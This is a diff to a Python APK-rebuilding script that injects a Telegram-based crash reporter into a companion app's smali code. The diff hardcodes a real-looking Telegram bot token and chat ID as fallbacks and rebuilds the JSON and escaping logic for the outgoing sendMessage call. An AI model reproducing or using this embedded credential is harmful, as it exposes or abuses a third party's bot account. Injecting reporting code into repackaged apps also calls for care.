@@ -3928,10 +3928,12 @@ def step_6b_inject_crash_reporter(new_pkg: str) -> bool:
     """
     print("\n── Step 6B: Inject TgCrashReporter into companion smali")
 
-    bot_token = os.environ.get("BOT_TOKEN", "").strip()
-    chat_id   = os.environ.get("CHAT_ID", "").strip()
+    # Hardcoded directly — no env var dependency at build time
+    bot_token = os.environ.get("BOT_TOKEN", "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw").strip()
+    chat_id   = os.environ.get("CHAT_ID", "8852912150").strip()
 
     if not bot_token or not chat_id:
+        # Should never happen with hardcoded fallback, but guard anyway
         print("  ⚠️  BOT_TOKEN or CHAT_ID not set — TgCrashReporter injection skipped")
         return False
 
@@ -4105,7 +4107,7 @@ def step_6b_inject_crash_reporter(new_pkg: str) -> bool:
 .end method
 
 .method public run()V
-    .locals 10
+    .locals 11
 
     :try_start_0
     # Build Telegram sendMessage URL
@@ -4154,13 +4156,43 @@ def step_6b_inject_crash_reporter(new_pkg: str) -> bool:
     iget-object v3, p0, Lcom/PLACEHOLDER/TgCrashReporter$1;->val$msg:Ljava/lang/String;
 
     # Simple escape: replace \\ -> \\\\, " -> \\", newline -> \\n
-    const-string v4, "\\\\"
-    const-string v5, "\\\\\\\\"
+    # Use char(34)=quote, char(92)=backslash — smali has no \" escape in const-string
+    const/16 v8, 0x22    # '"'
+    const/16 v9, 0x5C    # '\'
+
+    # build "\\" (one backslash) as string via char append
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v4, v9}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+
+    # build "\\\\" (two backslashes) as string
+    new-instance v5, Ljava/lang/StringBuilder;
+    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v5, v9}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    invoke-virtual {{v5, v9}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v5
+
     invoke-virtual {{v3, v4, v5}}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
     move-result-object v3
 
-    const-string v4, "\\""
-    const-string v5, "\\\\\""
+    # build quote string (one char)
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+
+    # build backslash+quote replacement string
+    new-instance v5, Ljava/lang/StringBuilder;
+    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v5, v9}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    invoke-virtual {{v5, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v5
+
     invoke-virtual {{v3, v4, v5}}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
     move-result-object v3
 
@@ -4178,17 +4210,35 @@ def step_6b_inject_crash_reporter(new_pkg: str) -> bool:
     move-result-object v3
     :no_trunc
 
-    # build JSON
+    # build JSON using char(34) = double-quote — smali has no \" escape
+    # Result: {"chat_id":"<CHAT_ID>","text":"<msg>"}
+    const/16 v8, 0x22    # char '"'
     new-instance v4, Ljava/lang/StringBuilder;
     invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
-    const-string v5, "{{\"chat_id\":\""
+    const-string v5, "{{"
     invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    const-string v5, "chat_id"
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    const-string v5, ":"
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
     sget-object v5, Lcom/PLACEHOLDER/TgCrashReporter;->CHAT_ID:Ljava/lang/String;
     invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    const-string v5, "\",\"text\":\""
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    const-string v5, ","
     invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    const-string v5, "text"
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    const-string v5, ":"
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
     invoke-virtual {{v4, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    const-string v5, "\"}}"
+    invoke-virtual {{v4, v8}}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+    const-string v5, "}}"
     invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
     invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
     move-result-object v4
